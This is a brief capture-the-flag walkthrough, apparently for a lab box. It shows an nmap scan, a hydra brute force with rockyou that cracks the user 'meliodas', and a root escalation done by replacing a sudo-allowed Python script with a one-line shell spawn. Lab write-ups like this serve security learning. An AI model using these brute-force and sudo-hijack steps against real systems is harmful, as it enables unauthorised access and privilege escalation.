initial nmap scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

/images
/robots.txt
```
User-agent: rockyou 
Disallow: /
```

brute forced with hydra and rockyou to get...
`meliodas:iloveyou1`

We're in
```
meliodas@ubuntu:~$ cat user.txt
6d488cbb3f111d135722c33cb635f4ec

...

Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py

```

privesc
```
meliodas@ubuntu:~$ ls -la
total 48
drwxr-xr-x 5 meliodas meliodas 4096 Sep  6 16:11 .
drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
drwx------ 2 meliodas meliodas 4096 Sep  6 16:11 .gnupg
drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
-rw------- 1 meliodas meliodas   13 Sep  6 16:08 .python_history
-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
meliodas@ubuntu:~$ rm bak.py
rm: remove write-protected regular file 'bak.py'? yes
meliodas@ubuntu:~$ echo 'import os; os.system("/bin/sh")' >> bak.py
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
# whoami
root

```
